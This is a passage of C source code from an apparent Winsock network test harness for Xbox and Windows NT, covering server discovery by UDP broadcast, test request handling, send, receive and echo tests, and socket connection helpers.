//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
void WINAPI MyLog(HANDLE hLog, DWORD dwLogLevel, LPSTR szFormat, ...)
{
	va_list pArgs; 
	va_start(pArgs, szFormat);
	
#ifdef _XBOX
// Xbox version sends out put to the xLog subsystem
	if(hLog != INVALID_HANDLE_VALUE)
		xLog_va(hLog, dwLogLevel, szFormat, pArgs);
#else // XBOX
// NT version (console) sends output to the standard output
	_vtprintf(szFormat, pArgs);
	_tprintf(TEXT("\r\n"));
#endif // ! XBOX
	
	va_end(pArgs);
}

#ifdef _XBOX
// Xbox version is a harness DLL, so we need DllMain, StartTest and EndTest

//==================================================================================
// DllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI DllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XnetInitialize(NULL, TRUE);
		InitializeCriticalSection(&g_csSerializeAccess);
		break;
	case DLL_PROCESS_DETACH:
		XnetCleanup();
		DeleteCriticalSection(&g_csSerializeAccess);
		break;
	default:
		break;
	}

    return TRUE;
}
#else
// NT version is an executable 

//==================================================================================
// _tmain
//----------------------------------------------------------------------------------
//
// Description: App entry point
//
// Arguments:
//	INT		argc		Int indicating num of cmd-line parameters available
//	TCHAR	*argvW[]	Array of command line available cmd-line parameters
// Returns:
//	An integer indicating exit status (ignored)
//==================================================================================
int _cdecl _tmain(INT argc, TCHAR *argvW[])
{

	InitializeCriticalSection(&g_csSerializeAccess);

//	ParseCommandLine();

	StartTest(NULL);

	EndTest();
	
	DeleteCriticalSection(&g_csSerializeAccess);

	return TRUE;
}
#endif // ! XBOX

//==================================================================================
// StartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI StartTest(IN HANDLE  hLog)
{
	TEST_PARAMS *pTestParams = NULL;
    WSADATA	WSAData;
	INT		nRet = 0;

	// Since we have to be thread safe, serialize entry for now
	EnterCriticalSection(&g_csSerializeAccess);

#ifdef _XBOX
    // Set the component and subcomponent
    xSetComponent(hLog, "Network(S)", "Winsock");
#endif

    // Init winsock
    if(nRet = WSAStartup(MAKEWORD(2, 2), &WSAData))
	{
		MyLog(hLog, XLL_FAIL, "Couldn't init winsock: %d", nRet);
		goto EXIT;
	}

//	MyLog(hLog, XLL_INFO, "Winsock layer initialized");

	// If we are running as a server, wait for incoming test requests and execute them
	if(IsServer())
	{
		DWORD dwSecondsToRun = 0, dwStartTick = 0;
		SOCKET BroadcastListener = INVALID_SOCKET;
		TEST_CASE NextTest = NO_TEST;
		HANDLE hClientHandlerThread = NULL;
		
		//BUGBUG - at some point, will want to automate getting the server wait time
		//		dwSecondsToRun = GetServerWaitTime();
		dwSecondsToRun = TIME_INFINITY;
		dwStartTick = GetTickCount();

		MyLog(hLog, XLL_INFO, "Listening for client programs...");

		// Create server socket here
		BroadcastListener = CreateBroadcastListenerSocket(hLog, FIND_SERVER_PORT);
		if(BroadcastListener == SOCKET_ERROR)
		{
			MyLog(hLog, XLL_WARN, "Couldn't create broadcast listening socket");
			goto EXIT;
		}

		// If time hasn't expired, continue running test
		while(!IsTimeExpired(dwSecondsToRun, dwStartTick))
		{
			NextTest = ProcessNextBroadcastPacket(hLog, BroadcastListener);

			pTestParams = (TEST_PARAMS *) LocalAlloc(LPTR, sizeof(TEST_PARAMS));
			if(!pTestParams)
			{
				MyLog(hLog, XLL_FAIL, "Not enough memory to allocate test params");
				goto EXIT;
			}

			// Server side of test always has these parameters in common
			pTestParams->dwSecondsToRun = TIME_INFINITY;
			pTestParams->fCleanUpAfterTest = TRUE;
			pTestParams->fInitiateConnection = FALSE;
			pTestParams->fNonBlocking = FALSE;
			pTestParams->fUseCriticalSection = FALSE;
			pTestParams->hLog = hLog;

			switch(NextTest)
			{
			case DOWNSTREAM_DATA:
				MyLog(hLog, XLL_INFO, "Client requested DOWNSTREAM_DATA test");
				// Server will send data to the client...
				pTestParams->fUseDelays = FALSE;
				if((hClientHandlerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoSendTest, (LPVOID) pTestParams, 0, NULL)) == INVALID_HANDLE_VALUE)
				{
					MyLog(hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
					goto EXIT;
				}
				pTestParams = NULL;
				CloseHandle(hClientHandlerThread);
				break;
			case UPSTREAM_DATA:
				MyLog(hLog, XLL_INFO, "Client requested UPSTREAM_DATA test");
				// Server will receive data from the client...
				pTestParams->fUseDelays = FALSE;
				if((hClientHandlerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoRecvTest, (LPVOID) pTestParams, 0, NULL)) == INVALID_HANDLE_VALUE)
				{
					MyLog(hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
					goto EXIT;
				}
				pTestParams = NULL;
				CloseHandle(hClientHandlerThread);
				break;
			case UPSTREAM_DATA_DELAYED_RECV:
				MyLog(hLog, XLL_INFO, "Client requested UPSTREAM_DATA_DELAYED_RECV test");
				// Server will receive data from the client...
				// but will occasionally delay to test recv window processing
				pTestParams->fUseDelays = TRUE;
				if((hClientHandlerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoRecvTest, (LPVOID) pTestParams, 0, NULL)) == INVALID_HANDLE_VALUE)
				{
					MyLog(hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
					goto EXIT;
				}
				pTestParams = NULL;
				CloseHandle(hClientHandlerThread);
				break;
			case ECHO:
				MyLog(hLog, XLL_INFO, "Client requested ECHO test");
				// Server will echo back data to the client
				pTestParams->fUseDelays = FALSE;
				if((hClientHandlerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoSingleThreadEchoServerTest, (LPVOID) pTestParams, 0, NULL)) == INVALID_HANDLE_VALUE)
				{
					MyLog(hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
					goto EXIT;
				}
				pTestParams = NULL;
				CloseHandle(hClientHandlerThread);
				break;
			case ECHO_DELAYED_RECV:
				MyLog(hLog, XLL_INFO, "Client requested ECHO_DELAYED_RECV test");
				// Server will echo back data to the client
				pTestParams->fUseDelays = TRUE;
				if((hClientHandlerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoSingleThreadEchoServerTest, (LPVOID) pTestParams, 0, NULL)) == INVALID_HANDLE_VALUE)
				{
					MyLog(hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
					goto EXIT;
				}
				pTestParams = NULL;
				CloseHandle(hClientHandlerThread);
				break;
			default:
				// No test to perform, wait for the next packet
				LocalFree(pTestParams);
				pTestParams = NULL;
				continue;
			}
		}

		closesocket(BroadcastListener);
		BroadcastListener = INVALID_SOCKET;
	}
	// If we are running as a client, search for a server and issue test requests to it
	else
	{
		// Allocate a test params structure
		pTestParams = (TEST_PARAMS *) LocalAlloc(LPTR, sizeof(TEST_PARAMS));
		if(!pTestParams)
		{
			MyLog(hLog, XLL_FAIL, "Not enough memory to allocate test params");
			goto EXIT;
		}

		pTestParams->hLog = hLog;
		pTestParams->dwSecondsToRun = 60;
		pTestParams->fCleanUpAfterTest = FALSE;

		if(!FindServer(hLog, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "No server found.  Exiting test.");
			goto EXIT;
		}

		// BLOCKING TESTS

		pTestParams->fNonBlocking = FALSE;

		// Request the server to recv
		if(!RequestTest(hLog, UPSTREAM_DATA, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = FALSE;
		DoSendTest(pTestParams);
		Sleep(1000);

		// Request the server to recv with delays
		if(!RequestTest(hLog, UPSTREAM_DATA_DELAYED_RECV, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = FALSE;
		DoSendTest(pTestParams);
		Sleep(1000);

		// Request the server to send, client will recv normally
		if(!RequestTest(hLog, DOWNSTREAM_DATA, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = FALSE;
		DoRecvTest(pTestParams);
		Sleep(1000);

		// Request the server to send, client will recv with delays
		if(!RequestTest(hLog, DOWNSTREAM_DATA, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = TRUE;
		DoRecvTest(pTestParams);
		Sleep(1000);

/*
		// Request the server to echo, client will do multithreaded send/recv
		if(!RequestTest(hLog, ECHO, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = TRUE;
		pTestParams->fUseDelays = FALSE;
		DoMultiThreadEchoClientTest(pTestParams);

		// Request the server to echo with delays, client will do multithreaded send/recv
		if(!RequestTest(hLog, ECHO_DELAYED_RECV, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = TRUE;
		pTestParams->fUseDelays = FALSE;
		DoMultiThreadEchoClientTest(pTestParams);

		// NON-BLOCKING TESTS

		pTestParams->fNonBlocking = TRUE;

		// Request the server to recv
		if(!RequestTest(hLog, UPSTREAM_DATA, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = FALSE;
		DoSendTest(pTestParams);

		// Request the server to recv with delays
		if(!RequestTest(hLog, UPSTREAM_DATA_DELAYED_RECV, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = FALSE;
		DoSendTest(pTestParams);

		// Request the server to send, client will recv normally
		if(!RequestTest(hLog, DOWNSTREAM_DATA, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = FALSE;
		DoRecvTest(pTestParams);

		// Request the server to send, client will recv with delays
		if(!RequestTest(hLog, DOWNSTREAM_DATA, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = FALSE;
		pTestParams->fUseDelays = TRUE;
		DoRecvTest(pTestParams);

		// Request the server to echo, client will do multithreaded send/recv
		if(!RequestTest(hLog, ECHO, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = TRUE;
		pTestParams->fUseDelays = FALSE;
		DoMultiThreadEchoClientTest(pTestParams);

		// Request the server to echo with delays, client will do multithreaded send/recv
		if(!RequestTest(hLog, ECHO_DELAYED_RECV, pTestParams->szDestinationAddress))
		{
			MyLog(hLog, XLL_INFO, "Couldn't request test from server.");
			goto EXIT;
		}
		Sleep(1000);
		pTestParams->fInitiateConnection = TRUE;
		pTestParams->fUseCriticalSection = TRUE;
		pTestParams->fUseDelays = FALSE;
		DoMultiThreadEchoClientTest(pTestParams);
*/

		LocalFree(pTestParams);
		pTestParams = NULL;
	}
	

EXIT:

	if(pTestParams)
		LocalFree(pTestParams);

	// Clean up winsock
//	MyLog(hLog, XLL_INFO, "Cleaning up Winsock layer");
	WSACleanup();

	// Allow other threads to enter now
	LeaveCriticalSection(&g_csSerializeAccess);
}            

//==================================================================================
// EndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI EndTest()
{
	// We already cleaned up everything at the end of StartTest
}

//==================================================================================
// IsServer
//----------------------------------------------------------------------------------
//
// Description:  Helper function that determines if this instance should run as a test server
//
// Arguments:
//  none
// Returns:
//	TRUE if this instance should be the test sever, FALSE otherwise
//==================================================================================
BOOL IsServer()
{
//BUGBUG - for now, hardcode to PC as server, Xbox as client
#ifdef _XBOX
	return FALSE;
#else // XBOX
	return TRUE;
#endif // ! XBOX
}

//==================================================================================
// IsTimeExpired
//----------------------------------------------------------------------------------
//
// Description:  Helper function that determines if the test should continue running
//
// Arguments:
//	DWORD	dwSecondsToRun			Number of seconds to run test
//	DWORD	dwStartTick				Original tick count when test was started
// Returns:
//	TRUE if the time has been reached, FALSE otherwise
//==================================================================================
BOOL IsTimeExpired(DWORD dwSecondsToRun, DWORD dwStartTick)
{
	DWORD dwMillisecondsToRun = dwSecondsToRun * 1000, dwCurrTick = 0;

	// If this test is set to run infinitely, then always return FALSE
	if(dwSecondsToRun >= TIME_INFINITY)
		return FALSE;

	dwCurrTick = GetTickCount();

	if(dwCurrTick < dwStartTick)
		// If the clock has wrapped around...
		return (((MAXDWORD - dwStartTick) + dwCurrTick) >= dwMillisecondsToRun);
	else
		// If the clock hasn't wrapped around...
		return ((dwCurrTick - dwStartTick) >= dwMillisecondsToRun);

}

//==================================================================================
// RandomRange
//----------------------------------------------------------------------------------
//
// Description: Helper function that generates random number between dwMin and dwMax
//
// Arguments:
//	DWORD	dwMin				Minimum random number desired
//	DWORD	dwMax				Maximum random number desired
// Returns:
//	DWORD containing the value of the generated random number
//==================================================================================
DWORD RandomRange(DWORD dwMin, DWORD dwMax)
{
    return((rand() % (dwMax - dwMin + 1)) + dwMin);
} 

//==================================================================================
// BuildTestPacket
//----------------------------------------------------------------------------------
//
// Description: Generate a pseudo-random number
//
// Arguments:
//	INT		nLength			Size of the buffer to fill
//	BYTE	Buffer[]		Buffer to fill with data
// Returns:
//	DWORD containing the checksum of the generated packet
//==================================================================================
DWORD BuildTestPacket(DWORD dwLength, BYTE *pBuffer)
{
    DWORD n = 0, dwCheckSum = 0;
	static char cNextChar = 'a';
	
	// Fill the buffer with random data and calculate the checksum
    for (n = 0; n < dwLength; n++)
    {
		//		if(n == (dwLength - 1))
		//			pBuffer[n] = 0xAA;
		//		else
		//			pBuffer[n] = (BYTE) RandomRange(0, 255);
		
		if(n == (dwLength - 1))
			pBuffer[n] = 0xAA;
		else
			pBuffer[n] = (BYTE) cNextChar;
		
        dwCheckSum += pBuffer[n];
		
		if(cNextChar == 'z')
			cNextChar = 'a';
		else
			++cNextChar;
    }	

    
    return(dwCheckSum);
}

//==================================================================================
// CalculateCheckSum
//----------------------------------------------------------------------------------
//
// Description: Calculate a checksum over a buffer
//
// Arguments:
//	INT		nLength			Size of the buffer to compute checksum over
//	BYTE	Buffer[]		Buffer to compute checksum over
// Returns:
//	DWORD containing the checksum of the buffer
//==================================================================================
DWORD CalculateCheckSum(DWORD dwLength, BYTE *pBuffer)
{
	DWORD n = 0, dwCheckSum = 0;

	// Calculate the checksum
    for (n = 0; n < dwLength; n++)
        dwCheckSum += pBuffer[n];
    
    return(dwCheckSum);
}

//==================================================================================
// EstablishConnection
//----------------------------------------------------------------------------------
//
// Description: Establishes a connection to the specified address.
//
// Arguments:
//	HANDLE	hLog					Handle to the logging subsystem
//	LPCSTR	szDestinationAddress	Address to connect with
//	BOOL	fNonBlocking			Indicates whether to make socket non-blocking
// Returns:
//	Connected SOCKET that has been connected to the specified address.
//==================================================================================
SOCKET EstablishConnection(HANDLE hLog, LPCSTR szDestinationAddress, BOOL fNonBlocking)
{
	
    SOCKADDR_IN		DestinationSockAddr  = { AF_INET };
	SOCKET			Connection = INVALID_SOCKET;
	LINGER			LingerOption;
	BOOL			fConnectionComplete = FALSE;
	
	// Fill in the destination address structure
	DestinationSockAddr.sin_port        = htons(SEND_RECV_PORT);
	if((DestinationSockAddr.sin_addr.s_addr = inet_addr(szDestinationAddress)) == INADDR_NONE)
	{
		MyLog(hLog, XLL_FAIL, "Invalid destination address: %s", szDestinationAddress);
		goto EXIT;
	}
	
	// Create the socket
	if((Connection = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't create STREAM socket: %u", WSAGetLastError());
		goto EXIT;
	}

	LingerOption.l_linger = 0;
	LingerOption.l_onoff = TRUE;

	// Set socket for hard-close so the other-side will terminate on a close
	if(setsockopt(Connection, SOL_SOCKET, SO_LINGER, (const char *) &LingerOption, sizeof(LINGER)) == SOCKET_ERROR)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't set socket for hard closes: %u", WSAGetLastError());
		goto EXIT;
	}

	// Set socket as non-blocking if necessary
	if(fNonBlocking)
	{
		DWORD	dwNonBlocking = TRUE;

		if(ioctlsocket(Connection, FIONBIO, &dwNonBlocking))
		{
			MyLog(hLog, XLL_INFO, "Couldn't set socket to be non-blocking");
			goto EXIT;
		}
	}

	// Connect the socket
	if (connect(Connection, (const struct sockaddr *) &DestinationSockAddr,  sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		// Wait for asynchronous completion if necessary
		if((WSAGetLastError() == WSAEWOULDBLOCK) && fNonBlocking)
		{
			while(!fConnectionComplete)
			{
				// Wait for socket to register as writeable (meaning connection has completed)
				if(IsSocketReady(Connection, WRITEABLE, 10))
				{
					fConnectionComplete = TRUE;
					MyLog(hLog, XLL_INFO, "Connection completed asynchronously");
					continue;
				}

				// If socket wasn't writeable, check to see if the connection failed
				if(IsSocketReady(Connection, EXCEPTION, 0))
				{
					MyLog(hLog, XLL_FAIL, "Connection attempt failed asynchronously");
					closesocket(Connection);
					goto EXIT;
				}
				
				MyLog(hLog, XLL_INFO, "Waiting for connection to complete");
				Sleep(1000);
			}
		}
		else
		{
			MyLog(hLog, XLL_FAIL, "Connection attempt failed: %u", WSAGetLastError());
			closesocket(Connection);
			Connection = INVALID_SOCKET;
			
			goto EXIT;
		}
	}
	else
		fConnectionComplete = TRUE;

EXIT:
//	fConnectionComplete ? MyLog(hLog, XLL_INFO, "Established connection") : 0;

	return Connection;
}

//==================================================================================
// WaitForIncomingConnection
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//	HANDLE	hLog					Handle to the logging subsystem
//	BOOL	fNonBlocking			Indicates whether to make socket non-blocking
// Returns:
//	SOCKET representing an accepted incoming connection
//==================================================================================
SOCKET WaitForIncomingConnection(HANDLE hLog, BOOL fNonBlocking)
{
	
    SOCKADDR_IN		LocalSockAddr = { AF_INET }, DestinationSockAddr = { AF_INET };
	SOCKET			Listener = INVALID_SOCKET, Connection = INVALID_SOCKET;
	LINGER			LingerOption;
	INT				nSockAddrSize = sizeof(SOCKADDR_IN);
	
    LocalSockAddr.sin_port        = htons(SEND_RECV_PORT);
    LocalSockAddr.sin_addr.s_addr = INADDR_ANY;
	
	// Create the socket
    if ((Listener = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't create STREAM socket: %u", WSAGetLastError());
		goto EXIT;
	}

	LingerOption.l_linger = 0;
	LingerOption.l_onoff = TRUE;

	// Set socket for hard-close so the other-side will terminate on a close
	if(setsockopt(Listener, SOL_SOCKET, SO_LINGER, (const char *) &LingerOption, sizeof(LINGER)) == SOCKET_ERROR)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't set socket for hard closes: %u", WSAGetLastError());
		goto EXIT;
	}

	// Set socket as non-blocking if necessary
	if(fNonBlocking)
	{
		DWORD	dwNonBlocking = TRUE;

		if(ioctlsocket(Connection, FIONBIO, &dwNonBlocking))
		{
			MyLog(hLog, XLL_INFO, "Couldn't set socket to be non-blocking");
			goto EXIT;
		}
	}

	// Bind the socket to the local address
    if (bind(Listener, (const struct sockaddr *) &LocalSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
		MyLog(hLog, XLL_FAIL, "Couldn't bind listening socket: %u", WSAGetLastError());
		goto EXIT;
    }
	
	// Start listening for incoming connections
    if (listen(Listener, 10) == SOCKET_ERROR)
    {
		MyLog(hLog, XLL_FAIL, "Couldn't listen on socket: %u", WSAGetLastError());
		goto EXIT;
    }

//	MyLog(hLog, XLL_FAIL, "Listening for incoming connections...");

	// If this is a non-blocking socket, wait for readability, which means an incoming connection is pending
	if(fNonBlocking)
	{
		while(!IsSocketReady(Connection, READABLE, 10))
		{
			// If the socket registers an exception condition, something failed somewhere
			if(IsSocketReady(Connection, EXCEPTION, 0))
			{
				MyLog(hLog, XLL_FAIL, "An error occured while asynchronously waiting for inbound connections");
				goto EXIT;
			}
		}
	}

	// Accept the first incoming connection
	if ((Connection = accept(Listener, (struct sockaddr *) &DestinationSockAddr, &nSockAddrSize)) == INVALID_SOCKET)
	{
		if(fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
			MyLog(hLog, XLL_WARN, "This socket reported readability, but accept returned WSAEWOULDBLOCK");

		MyLog(hLog, XLL_FAIL, "Couldn't accept incoming connection: %u", WSAGetLastError());
		goto EXIT;
	}

//	MyLog(hLog, XLL_INFO, "Accepted incoming connection");

EXIT:

	// Clean up the listener socket, we don't need it anymore
	if(Listener != INVALID_SOCKET)
	{
		closesocket(Listener);
		Listener = INVALID_SOCKET;
	}

	return Connection;
}

//==================================================================================
// CreateBroadcastListenerSocket
//----------------------------------------------------------------------------------
//
// Description: Creates a socket to listen for broadcast packets
//
// Arguments:
//  HANDLE			hLog				Handle to the logging subsystem
//  WORD			wPort				Port to bind the socket to
// Returns:
//	Returns value indicating the next test case for the server to run
//==================================================================================
SOCKET CreateBroadcastListenerSocket(HANDLE hLog, WORD wPort)
{
    SOCKADDR_IN		LocalSockAddr = { AF_INET };
	SOCKET			BroadcastListener = INVALID_SOCKET;
	INT				nSockAddrSize = sizeof(SOCKADDR_IN);
	
    LocalSockAddr.sin_port        = htons(wPort);
    LocalSockAddr.sin_addr.s_addr = INADDR_ANY;
	
	// Create the socket
    if ((BroadcastListener = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't create DGRAM socket: %u", WSAGetLastError());
		goto EXIT;
	}

	// Bind the socket to the local address
    if (bind(BroadcastListener, (const struct sockaddr *) &LocalSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
		MyLog(hLog, XLL_FAIL, "Couldn't bind broadcast listening socket: %u", WSAGetLastError());
		goto EXIT;
    }

EXIT:

	return BroadcastListener;
}

//==================================================================================
// ProcessNextBroadcastPacket
//----------------------------------------------------------------------------------
//
// Description: Reads a datagram from the broadcast listener and responds appropriately
//
// Arguments:
//  HANDLE			hLog					Handle to the logging subsystem
//	SOCKET			BroadcastListener		Socket that server receives test requests on
// Returns:
//	Returns value indicating the next test case for the server to run
//==================================================================================
TEST_CASE ProcessNextBroadcastPacket(HANDLE hLog, SOCKET BroadcastListener)
{
	TESTREQUEST_PACKET *pTestRequest = NULL;
	GENERIC_PACKET *pPacket = NULL;
	TEST_CASE NextTest = NO_TEST;
	SOCKADDR_IN SocketAddress;
	DWORD	dwBytesAvailable = 0;
	BYTE	PacketBuffer[MAX_PACKET_SIZE];
	INT		n = 0, nAddressSize = sizeof(SOCKADDR_IN);
	static BOOL fArrayInitialized = FALSE;
	static INT nLastTestIndex = 0;
	static DWORD dwLastTests[10];

	// Initialize this static array only once...
	// This static array is a simple but imperfect attempt to prevent a client from losing a notification
	// that we started a test.  The client will ask again, but we'll recognize that the test ID is one of
	// the last 10 tests we launched... so we won't respawn the test, but we'll notify the client that the
	// already spawned test is waiting for it
	if(!fArrayInitialized)
	{
		nLastTestIndex = 0;

		for(n = 0; n < 10; ++n)
			dwLastTests[n] = 0;

		fArrayInitialized = TRUE;
	}

	pPacket = (GENERIC_PACKET *) PacketBuffer;

	// If we haven't received data within 10 seconds, exit...
	if(!IsSocketReady(BroadcastListener, READABLE, 10))
		goto EXIT;

	// See how large the next available datagram is...
	if(ioctlsocket(BroadcastListener, FIONREAD, &dwBytesAvailable))
	{
		MyLog(hLog, XLL_WARN, "Couldn't determine if bytes are available on socket");
		goto EXIT;
	}

	if(!dwBytesAvailable)
		goto EXIT;

	// If it's too large, truncate it
	if(dwBytesAvailable > MAX_PACKET_SIZE)
	{
		MyLog(hLog, XLL_WARN, "Received packet was too large: %u bytes", dwBytesAvailable);
		dwBytesAvailable = MAX_PACKET_SIZE;
	}

	// Read the datagram
	if (recvfrom(BroadcastListener, (char *) pPacket, dwBytesAvailable, 0, (struct sockaddr *) &SocketAddress, &nAddressSize) == SOCKET_ERROR)
	{	
		MyLog(hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
		goto EXIT;				
	}

	// Determine what type of packet it is
	switch(pPacket->dwPacketType)
	{
		SERVREPLY_PACKET ServReply;
		TESTREPLY_PACKET TestReply;
	case FINDSERV:
//		MyLog(hLog, XLL_INFO, "Received FINDSERV packet from a client");
		// Received a packet from a client trying to find a server, reply back to indicate we're here
		ServReply.dwPacketType = SERVREPLY;
		if (sendto(BroadcastListener, (char *) &ServReply, 1 * sizeof(DWORD), 0, (struct sockaddr *) &SocketAddress, nAddressSize) == SOCKET_ERROR)
		{
			MyLog(hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
			goto EXIT;				
		}
		break;
	case TESTREQUEST:
//		MyLog(hLog, XLL_INFO, "Received TESTREQUEST packet from a client");
		pTestRequest = (TESTREQUEST_PACKET *) pPacket;

		// See if we already spawned this test
		for(n = 0; n < 10; ++n)
		{
			if(dwLastTests[n] == pTestRequest->dwTestID)
				break;
		}

		// We didn't already spawn this test, so mark it as the test to launch and record this test ID.
		if(n == 10)
		{
			nLastTestIndex = (nLastTestIndex + 1) % 10;
			dwLastTests[nLastTestIndex] = NextTest = pTestRequest->TestRequested;
		}

		// Initialize the reply packet to send
		TestReply.dwPacketType = TESTREPLY;
		TestReply.dwTestID = pTestRequest->dwTestID;
		TestReply.TestRequested = pTestRequest->TestRequested;

		// Received a packet from a client requesting a test, reply back to indicate we are running the server side
		if (sendto(BroadcastListener, (char *) &TestReply, 3 * sizeof(DWORD), 0, (struct sockaddr *) &SocketAddress, nAddressSize) == SOCKET_ERROR)
		{
			MyLog(hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
			goto EXIT;				
		}
		break;
	case SERVREPLY:
	case TESTREPLY:
	case SENDRECV:
		// Ignore these packets
		break;
	default:
		MyLog(hLog, XLL_INFO, "Received packet is of unknown type: %u", pPacket->dwPacketType);
		goto EXIT;
	}

EXIT:

	return NextTest;
}

//==================================================================================
// FindServer
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//	HANDLE		hLog						Handle to the logging subsystem
//	CHAR		*szDestinationAddress		String to be filled with IP address of server
// Returns:
//	Returns TRUE if the server was found, FALSE otherwise
//==================================================================================
BOOL FindServer(HANDLE hLog, CHAR *szDestinationAddress)
{
	FINDSERV_PACKET *pFindServPacket = NULL;
	GENERIC_PACKET *pGenericPacket = NULL;
	SOCKADDR_IN DestinationAddress;
	SOCKET	SearchSocket = INVALID_SOCKET;
	DWORD	dwBytesAvailable = 0;
	BYTE	PacketBuffer[MAX_PACKET_SIZE];
	BOOL	fEnableBroadcast = TRUE, fFoundServer = FALSE;
	INT		nAddressSize = 0;

#ifdef _XBOX
	SOCKADDR_IN LocalAddress;
#endif

	// Create the socket
    if((SearchSocket = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't create DGRAM socket: %u", WSAGetLastError());
		goto EXIT;
	}

	// Set the socket to enable broadcast transmissions
	if(setsockopt(SearchSocket, SOL_SOCKET, SO_BROADCAST, (const char *) &fEnableBroadcast, sizeof(fEnableBroadcast)) == SOCKET_ERROR)
	{
		MyLog(hLog, XLL_FAIL, "Couldn't enable socket to send broadcast packets: %u", WSAGetLastError());
		goto EXIT;
	}

#ifdef _XBOX
// BUGBUG - this is a workaround for the fact that Xbox requires UDP sockets
//          to be explicitly bound before sending

	LocalAddress.sin_family = AF_INET;
    LocalAddress.sin_port = htons(FIND_SERVER_PORT);
    LocalAddress.sin_addr.s_addr = INADDR_ANY;

	// Bind the socket to the local address
    if (bind(SearchSocket, (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
